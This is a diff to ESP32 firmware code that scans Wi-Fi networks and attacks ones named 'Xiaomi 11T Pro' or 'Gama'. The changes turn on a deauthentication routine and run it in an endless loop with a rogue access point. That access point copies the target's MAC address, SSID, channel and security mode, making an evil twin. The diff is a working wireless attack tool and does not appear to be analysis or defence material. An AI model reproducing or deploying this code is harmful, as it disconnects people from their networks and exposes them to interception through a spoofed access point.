@@ -57,9 +57,6 @@ static void print_auth_mode(int authmode)
     case WIFI_AUTH_WPA3_ENT_192:
         ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_ENT_192");
         break;
-    case WIFI_AUTH_WPA3_EXT_PSK:
-        ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_WPA3_EXT_PSK");
-        break;
     default:
         ESP_LOGI(TASK_NAME, "Authmode \tWIFI_AUTH_UNKNOWN");
         break;
@@ -182,9 +179,13 @@ void scanWifi(void *pvParameter){
             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
             ESP_LOGI(TASK_NAME, "########################################\n");
             if(!strcmp("Xiaomi 11T Pro", (char *)apRecords[i].ssid) || !strcmp("Gama", (char *)apRecords[i].ssid)){
-                ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
-                //deauth_task(apRecords[i].bssid,apRecords[i].primary);
-                attack_method_rogueap(&apRecords[i]);
+                while(1){
+                    ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
+                    deauth_task(apRecords[i].bssid,apRecords[i].primary);
+                    attack_method_rogueap(&apRecords[i]);
+                    vTaskDelay(1000 / portTICK_PERIOD_MS);
+                }
+
             }
         }
         
@@ -247,19 +248,24 @@ void deauth_task(MacAddr bssid, uint8_t prim_chan) {
 
 }
 
+uint8_t strlen_uint8(uint8_t *str){
+    uint8_t i = 0;
+    while(str[i] != '\0'){
+        i++;
+    }
+    return i;
+}
+
 void attack_method_rogueap(wifi_ap_record_t *ap_record){
     ESP_LOGD(TASK_NAME, "Configuring Rogue AP");
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
     ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, ap_record->bssid));
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid_len = strlen((uint8_t *)ap_record->ssid),
-            .channel = ap_record->primary,
-            .authmode = ap_record->authmode,
-            .password = "dummypassword",
-            .max_connection = 1
-        }
-    };
+    wifi_config_t ap_config = {};
+    ap_config.ap.ssid_len = strlen_uint8((uint8_t *)ap_record->ssid);
+    ap_config.ap.channel = ap_record->primary;
+    ap_config.ap.authmode = ap_record->authmode;
+    memcpy((unsigned char*) ap_config.ap.password,"dummypassword",14);
+    ap_config.ap.max_connection = 1;
     mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
 }
